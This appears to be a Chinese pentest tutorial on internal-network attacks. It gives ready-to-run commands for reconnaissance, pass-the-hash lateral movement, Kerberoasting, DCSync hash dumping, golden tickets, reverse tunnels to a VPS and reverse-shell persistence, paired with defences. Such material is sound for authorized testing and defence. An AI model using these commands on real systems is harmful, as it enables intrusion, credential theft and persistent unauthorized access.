# 内网渗透(Internal Network Penetration Testing)

> 关键词:内网渗透, 内网信息收集, 存活探测, 横向移动, PsExec, WMI, 域渗透, Active Directory, Kerberoasting, AS-REP Roasting, 黄金票据, DCSync, GPP密码, 内网隧道, frp, nps, EarthWorm, proxychains, 权限维持, 域控

## 概述

内网渗透指获得边界主机权限后,在**内部网络**中进行信息收集、横向移动、域渗透、隧道搭建与权限维持的过程。内网渗透是攻防演练与红队评估的核心阶段,也是检测能力的重要检验场。

> ⚠️ **仅限授权测试**:内网渗透影响面大(可能波及生产业务),必须在书面授权范围内进行,明确允许触碰的网段与系统;隧道与权限维持技术仅用于授权演练。

## 内网信息收集

获得一台主机权限后,先做**本机+环境信息收集**,再向外扩展。

```bash
# Linux 跳板机信息收集
hostname; id; uname -a; ip addr; ip route
cat /etc/hosts; cat /etc/resolv.conf          # DNS 配置常泄露域环境
arp -a                                          # 同网段主机
cat /etc/passwd; ls /home/                      # 用户
ss -tlnp                                        # 监听端口
history; find / -name "*.conf" -o -name "*.ini" 2>/dev/null | head -50
```

```cmd
:: Windows 主机信息收集
whoami /all
ipconfig /all
net view /domain                          :: 查看域
net group "domain admins" /domain         :: 域管理员(需域权限)
net user /domain
netstat -ano
tasklist /svc
arp -a
:: 本机凭据/敏感文件
dir /s /b C:\*.txt C:\*.ini C:\*.conf 2>nul | findstr /i "pass config"
:: 域信息
echo %logonserver%
nltest /dclist:域名
```

**关键信息产出**:本机网段、网关、DNS 域、域控制器、同网段主机、共享、已保存凭据、其他网段路由。

## 内网存活探测

```bash
# ICMP 存活(被禁 ping 时不可靠)
for i in $(seq 1 254); do ping -c 1 -W 1 192.168.1.$i | grep "bytes from" & done
# ARP 扫描(同网段,准确)
arp-scan 192.168.1.0/24
# nmap 内网扫描(注意限速,避免打崩设备)
nmap -sn 192.168.1.0/24
nmap -Pn -p 445,3389,22,80 --open 192.168.1.0/24 -oG - | awk '/open/{print $2}'
# 快速端口探测:fscan(内网工具,需自评估合规性)
# fscan -h 192.168.1.0/24 -np -nopoc
```

**判断标准**:重点收集开放 **445(SMB)、3389(RDP)、22(SSH)、5985(WinRM)、389/636(AD)、3306/1433/6379(数据库)** 的主机,它们是横向移动的主要目标。

## 横向移动

横向移动 = 用已获得的账号/凭据在主机间移动。常用方法:

### PsExec(445)

```bash
# impacket 版(跨平台)
impacket-psexec 域/用户:密码@192.168.1.10
impacket-psexec -hashes :NTLM哈希 域/用户@192.168.1.10   # Pass-the-Hash
# Sysinternals 版(Windows)
# psexec \\192.168.1.10 -u 用户 -p 密码 cmd.exe
# 原理:通过 SMB 上传服务并执行,需管理员权限;会被 EDR 重点监控
```

### WMI(135)

```bash
# impacket-wmiexec(不落盘文件,更隐蔽)
impacket-wmiexec 域/用户:密码@192.168.1.10
# 原生 wmic(Windows)
# wmic /node:192.168.1.10 /user:域\用户 /password:密码 process call create "cmd.exe /c whoami > c:\1.txt"
# WMI 走 RPC(135),执行时创建进程,同样有日志
```

### SMB 共享 / 计划任务

```cmd
:: 通过共享写文件 + 触发(受限环境)
copy nc.exe \\192.168.1.10\C$\windows\temp\
:: 计划任务远程创建(SYSTEM 权限)
schtasks /create /s 192.168.1.10 /u 域\用户 /p 密码 /tn task1 /tr "cmd.exe /c ..." /sc once /st 00:00
schtasks /run /s 192.168.1.10 /u 域\用户 /p 密码 /tn task1
```

### RDP(3389)

```bash
# 开启目标 RDP(若未开,需管理员权限)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
# Linux 连接
xfreerdp /v:192.168.1.10 /u:用户 /p:密码 /cert-ignore /dynamic-resolution
# RDP 会话劫持(同权限用户,授权环境):query user → tscon 会话ID
```

**横向移动检测**:EDR 监控 PsExec/WMI/Schtasks 的远程进程创建(4688 事件)、SMB 异常、计划任务创建(4698);对管理员账号异地登录告警。

## 域渗透(Active Directory)

域(AD)是内网攻击的**核心目标**,拿下域控 = 拿下整个域。

### AD 侦察

```bash
# BloodHound(图形化分析攻击路径)
# 收集:bloodhound-python -u 用户 -p 密码 -d 域名 -c All -ns 域控IP
# 分析:neo4j + BloodHound GUI,查询"最短路径到域管"
# 命令行侦察(ldapsearch)
ldapsearch -x -H ldap://域控IP -D "域\用户" -w 密码 -b "DC=域名,DC=com" "(objectClass=user)" sAMAccountName
# 本机工具(Windows):PowerView、ADModule
# 关注对象:域管组、高权限组(Enterprise Admins)、机器账户、委派、ACL 异常
```

### Kerberoasting(SPN 票据攻击)

**原理**:普通域用户可请求服务主体名(SPN)关联账户的 TGS 票据,票据用服务账户密码加密,离线爆破即可得到明文密码(服务账户常为弱口令)。

```bash
# 1) 找 SPN 账户
# GetUserSPNs.py 域/用户:密码 -dc-ip 域控IP -request
impacket-GetUserSPNs 域/用户:密码 -dc-ip 192.168.1.1 -request -outputfile hash.txt
# 2) 离线爆破(hashcat 模式 13100)
hashcat -m 13100 hash.txt rockyou.txt
# 3) 得到服务账户密码后可登录其服务/横向
```

**防御**:服务账户使用强随机密码并定期轮换;gMSA(组托管服务账户)自动轮换;监控 TGS-REQ 异常批量请求(4769 事件)。

### AS-REP Roasting

**原理**:未启用预认证(UF_DONT_REQUIRE_PREAUTH)的账户,可无密码请求 AS 票据,票据用该账户密码加密,离线爆破。

```bash
impacket-GetNPUsers 域/用户:密码 -dc-ip 192.168.1.1 -usersfile users.txt -request
hashcat -m 18200 hash.txt rockyou.txt   # 模式 18200
```

**防御**:所有用户开启预认证;监控 AS-REQ 无预认证请求(4768 事件);同样建议 gMSA。

### 黄金票据 / 白银票据

| 票据 | 原理 | 伪造条件 | 危害 |
| --- | --- | --- | --- |
| 黄金票据 | 伪造 TGT,需拿到 **krbtgt 哈希**(域控权限) | 域 SID + krbtgt hash | 伪造任意域用户,长期有效 |
| 白银票据 | 伪造服务票据(TGS),需服务账户 **NTLM 哈希** | 服务 hash + SPN | 访问指定服务,难被 KDC 审计发现 |

```bash
# 黄金票据生成(仅授权环境,需已获取 krbtgt hash)
# mimikatz 思路(工具用法示例,需管理员):
# lsadump::dcsync /domain:域名 /user:krbtgt
# kerberos::golden /user:fakeadmin /domain:域名 /sid:S-1-5-21-xxx /krbtgt:哈希
# 白银票据:
# kerberos::golden /user:任意用户 /domain:域名 /sid:... /target:目标服务 /service:cifs /rc4:服务hash
```

**防御**:频繁轮换 krbtgt 密码(两次,间隔足够);白银票据需服务账户轮换;监控异常 Kerberos 票据使用(4769/4770);开启**票据年龄**与 PAC 校验(MSV 补丁)。

### DCSync(目录复制)

**原理**:拥有 `Replicating Directory Changes` 权限的账号可模拟域控复制,导出任意账户(含 krbtgt、域管)哈希。

```bash
# impacket-secretsdump 远程 DCSync(需域管/复制权限)
impacket-secretsdump 域/管理员:密码@域控IP
# 提取全部哈希后:本地离线爆破 / Pass-the-Hash 横向
```

**防御**:审计 `Replicating Directory Changes` 权限(默认仅域控/域管);监控 4662 目录复制事件;关键账户启用**受保护用户组**。

### GPP 密码(组策略首选项)

**原理**:SYSVOL 中的 Groups.xml 等 GPP 文件含加密的本地管理员密码,密钥公开(微软 2014 年已公开),可解密。

```bash
# 定位(域内任意可读 SYSVOL)
# \\域名\SYSVOL\域名\Policies\{GUID}\MACHINE\Preferences\Groups\Groups.xml
# 解密:gpp-decrypt(工具,输入 cpassword 字段)
# 自动化:impacket-Get-GPPPassword 域/用户:密码 -dc-ip 域控IP
```

**防御**:微软已禁用 GPP 密码写入(2014 后);审计 SYSVOL 中残留 Groups.xml;使用 LAPS 管理本地管理员密码。

## 内网隧道与代理

边界主机无法直接访问内网时,需要隧道与代理链。

### SSH 隧道

```bash
# 本地转发:把本机端口转发到内网主机(通过跳板)
ssh -L 127.0.0.1:8080:内网Web:80 user@跳板机 -N
# 远程转发:把跳板机端口转发回本地(跳板可出网时)
ssh -R 1234:127.0.0.1:5555 user@公网VPS -N
# 动态转发(SOCKS5 代理)
ssh -D 1080 user@跳板机 -N
# 用法:proxychains 配合
proxychains curl http://内网Web/
```

### frp(反向代理,需公网 VPS)

```bash
# 服务端(VPS)frps.ini
# [common] bind_port = 7000
# 客户端(跳板)frpc.ini
# [common] server_addr = VPS_IP; server_port = 7000
# [socks5] type = tcp; remote_port = 1080; plugin = socks5
# 启动
./frps -c frps.ini        # VPS
./frpc -c frpc.ini        # 跳板
# 之后 proxychains socks5 VPS_IP 1080 访问内网
```

### nps(类 frp,Web 管理)

```bash
# 服务端:nps install / nps start,Web 管理 8080
# 客户端:npc -server=VPS:8024 -vkey=密钥
# 支持 SOCKS5、HTTP 代理、端口映射,管理界面更友好
```

### EarthWorm(EW,内网渗透经典工具)

```bash
# 正向代理(跳板有公网 IP 时):./ew_for_linux64 -s ssocksd -l 1080
# 反向代理(跳板仅内网):./ew -s rcsocks -l 1080 -e 8888   (公网机)
# ./ew -s rssocks -d 公网IP -e 8888                       (内网机)
```

### ICMP / DNS 隧道

```bash
# ICMP 隧道:ptunnel / icmpsh(利用 ICMP 回显传数据,适合禁 TCP 出口环境)
# DNS 隧道:dns2tcp / iodine / dnscat2(把数据编码进 DNS 查询,适合仅放行 DNS)
# 注意:DNS 隧道流量特征明显,多数 DNS 安全设备可检测;仅授权环境使用
```

### 代理链工具

```bash
# proxychains(配置 /etc/proxychains.conf)
# socks4 127.0.0.1 1080
proxychains nmap -sT -Pn -p 445 内网IP        # 注意:proxychains 下仅 TCP 全连接可用
proxychains impacket-psexec 域/用户:密码@内网IP
# 多级代理:链式配置多个 proxy;或使用 frp/nps 级联
```

## 权限维持(后渗透持久化)

获得域控/高权限后,为保障后续访问需建立持久化(仅授权演练,演练结束必须清除)。

| 平台 | 方式 | 说明 |
| --- | --- | --- |
| Linux | SSH 公钥植入 | `~/.ssh/authorized_keys` 添加攻击者公钥 |
| Linux | cron 任务 | 定时反弹 shell(注意日志) |
| Linux | 服务/启动项 | systemd service、rc.local |
| Windows | 计划任务 | `schtasks /create` 反弹 |
| Windows | 服务 | `sc create` 恶意服务(开机自启) |
| Windows | 注册表自启动 | `HKCU\...\Run`、`RunOnce` |
| Windows | WMI 事件订阅 | `__EventFilter` + `__EventConsumer` 触发命令,隐蔽 |
| 域 | 域管持久化 | 新增域管账号(痕迹明显,慎用) |
| 域 | 黄金票据 | 已获 krbtgt hash 后随时可伪造(见上文) |
| 域 | AdminSDHolder/SID History | 高级持久化(高对抗场景) |

```powershell
# WMI 事件订阅示例(反弹,仅授权环境,演练后清理)
# 创建事件过滤器与消费者指向恶意脚本路径
```

**清除要求**:演练结束应删除植入的公钥、计划任务、服务、注册表项,恢复被改配置,并向防守方说明。

## 防御视角

1. **网络分段与微隔离**:按业务隔离网段,阻断横向扩散路径;关键系统(数据库、域控)双向白名单。
2. **凭据治理**:服务账户 gMSA、域管使用专门工作站、禁本地管理员密码一致(用 LAPS)、定期轮换。
3. **AD 安全加固**:开启预认证、审计复制权限、轮换 krbtgt、部署**受保护用户组**、监控 Kerberos 异常。
4. **横向移动检测**:EDR 监控 PsExec/WMI/Schtasks 远程执行、4688 进程创建、445/135 异常流量。
5. **隧道检测**:出口仅允许必要协议、DNS 安全解析、IPS 检测 ICMP/DNS 隧道特征、出网代理审计。
6. **主机加固**:最小权限、关闭高危服务、补丁管理(横向多依赖 SMB 与已知 CVE)。
7. **蜜罐与欺骗**:部署高交互蜜罐(如 AD 蜜罐账号)捕获横向行为。
8. **应急演练**:定期红蓝对抗验证检测与响应能力,沉淀告警规则。
